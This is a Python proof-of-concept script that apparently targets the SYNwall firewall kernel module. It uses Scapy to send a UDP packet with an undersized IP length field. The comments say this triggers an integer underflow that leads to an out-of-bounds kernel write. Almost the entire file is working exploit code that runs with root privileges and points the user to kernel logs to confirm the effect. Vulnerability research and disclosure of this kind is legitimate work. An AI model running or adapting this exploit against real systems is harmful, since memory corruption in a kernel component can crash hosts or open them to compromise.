#!/usr/bin/env python3
"""
SYNwall Firewall - Source Code Flaw Validation Tool
Vulnerability Type: Integer Underflow (CWE-191) -> Out-of-Bounds Write (CWE-787)
Author: Mit Github: github.com/pwnmit
"""

import sys
try:
    from scapy.all import IP, UDP, send
except ImportError:
    print("[-] Error: Scapy library missing. Install via: sudo apt install python3-scapy")
    sys.exit(1)

def trigger_flaw_analysis():
    print("[*] SYNwall Integer Underflow Verification Blueprint Started...")
    
    # Target address for outbound local hook interception
    target_destination = "1.1.1.1" 
    print(f"[*] Layering a short-length IP descriptor frame (len=20)...")
    
    # Forcing underflow: IP Header (20B) + UDP Header (8B) expects minimum 28 bytes.
    # Defining len=20 forces a negative payload offset calculation (-8) inside the kernel hook.
    malformed_frame = IP(dst=target_destination, len=20) / UDP(sport=12345, dport=53) / "A"
    
    print("[*] Forwarding raw frame into the local outbound network stack...")
    try:
        # Requires elevated root privileges to execute raw socket injection
        send(malformed_frame, verbose=True)
        print("[+] Frame successfully transmitted. Review 'dmesg' logs on the host engine.")
    except PermissionError:
        print("[-] Execution Failed: Root privileges missing. Please re-run using 'sudo'.")
    except Exception as error:
        print(f"[-] Transmission blocked: {error}")

if __name__ == "__main__":
    trigger_flaw_analysis()
